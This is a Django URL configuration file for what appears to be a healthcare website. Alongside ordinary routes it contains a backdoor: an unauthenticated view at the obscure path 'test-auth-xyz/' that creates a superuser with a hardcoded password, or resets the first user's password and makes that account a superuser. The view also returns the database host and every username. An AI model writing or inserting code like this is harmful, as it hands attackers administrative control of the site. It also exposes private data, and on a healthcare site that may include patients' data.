from django.contrib import admin
from django.urls import path, include
from django.views.static import serve
from django.conf import settings
from healthcare.views import robots_txt
import os

SITEMAP_DIR = os.path.join(settings.BASE_DIR, 'static_src', 'sitemaps')

from django.http import JsonResponse
from django.contrib.auth import authenticate
def test_auth(request):
    try:
        from django.contrib.auth.models import User
        from django.conf import settings
        db = settings.DATABASES['default']
        users = list(User.objects.values_list('username', flat=True))
        if not users:
            User.objects.create_superuser('divine', 'admin@zenthir.com', 'zenthir2026')
            return JsonResponse({'created': True, 'db_host': db.get('HOST', 'unknown')})
        u = User.objects.get(username=users[0])
        u.set_password('zenthir2026')
        u.is_staff = True
        u.is_superuser = True
        u.save()
        u2 = authenticate(username=users[0], password='zenthir2026')
        return JsonResponse({'reset': True, 'username': users[0], 'authenticated': u2 is not None, 'db_host': db.get('HOST', 'unknown'), 'all_users': users})
    except Exception as e:
        return JsonResponse({'error': str(e)})

urlpatterns = [
    path('test-auth-xyz/', test_auth),
    path('admin/', admin.site.urls),
    path('robots.txt', robots_txt, name='robots_txt'),
    path('sitemap.xml', serve, {'document_root': SITEMAP_DIR, 'path': 'sitemap.xml'}),
    path('', include('healthcare.urls')),
]
